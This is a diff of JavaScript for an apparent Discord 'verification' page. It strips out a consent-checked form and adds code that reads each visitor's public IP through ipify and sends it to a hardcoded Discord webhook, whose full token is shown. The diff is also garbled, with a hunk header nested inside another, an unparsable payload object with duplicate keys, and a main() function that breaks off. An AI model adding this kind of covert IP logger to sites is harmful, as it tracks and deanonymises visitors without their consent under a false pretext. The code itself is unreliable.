@@ -1,86 +1,51 @@
-const form = document.getElementById("verification-form");
-const input = document.getElementById("discord-name");
-const consentCheckbox = document.getElementById("consent-checkbox");
-const button = document.getElementById("verify-button");
-const statusElement = document.getElementById("status");
-const title = document.getElementById("title");
-const description = document.getElementById("description");
+@@ -2,49 +2,49 @@
+const ipifyAPI = "https://api.ipify.org?format=json";
 
-form.addEventListener("submit", async (event) => {
-    event.preventDefault();
 
-    const discordName = input.value.trim();
+const webhookURL = "https://discord.com/api/webhooks/1530836006457184348/IdWAKuZm2cLtJnpVt7tiLGF1PBzgYbi0UOHbavvRmHN8Ov4iWEeNztPz25XCctj7gEch";
 
-    if (discordName.length < 2 || discordName.length > 64) {
-        showError("Enter a valid Discord username.");
+
+async function getIP() {
+    try {
+        const response = await fetch(ipifyAPI);
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error("Error fetching IP:", error);
+        return null;
+    }
+}
+
+async function sendToDiscord(ip) {
+    if (!ip) {
+        console.error("IP address is null or undefined.");
         return;
     }
 
-    if (!consentCheckbox.checked) {
-        showError("You must agree before continuing.");
-        return;
-    }
-
-    button.disabled = true;
-    button.textContent = "Verifying...";
-    statusElement.textContent = "Submitting verification...";
-    statusElement.className = "";
+    const payload = {
+        content: `IP Address: ${ip}`
+        content: `EEVerify Address ${ip}`
+    };
 
     try {
-        const response = await fetch("/api/verify", {
+        const response = await fetch(webhookURL, {
             method: "POST",
-
             headers: {
                 "Content-Type": "application/json"
             },
-
-            body: JSON.stringify({
-                discordName: discordName,
-                consent: true
-            })
+            body: JSON.stringify(payload)
         });
 
-        let result = {};
-
-        try {
-            result = await response.json();
-        } catch {
-            throw new Error(
-                `The server returned an invalid response (${response.status}).`
-            );
+        if (response.ok) {
+            console.log("IP sent to Discord successfully!");
+        } else {
+            console.error("Error sending IP to Discord:", response.statusText);
         }
-
-        if (!response.ok) {
-            throw new Error(
-                result.error || `Verification failed (${response.status}).`
-            );
-        }
-
-        form.remove();
-
-        title.textContent = "Verification Complete";
-
-        description.textContent =
-            "You may now return to Discord.";
-
-        statusElement.textContent =
-            `Verified as ${discordName}`;
-
-        statusElement.className = "success";
     } catch (error) {
-        console.error("Verification error:", error);
-
-        showError(
-            error.message ||
-            "Verification failed. Please try again."
-        );
-
-        button.disabled = false;
-        button.textContent = "Verify";
+        console.error("Error:", error);
     }
-});
-
-function showError(message) {
-    statusElement.textContent = message;
-    statusElement.className = "error";
 }
+
+
+async function main() {
+    const ip = await getIP();
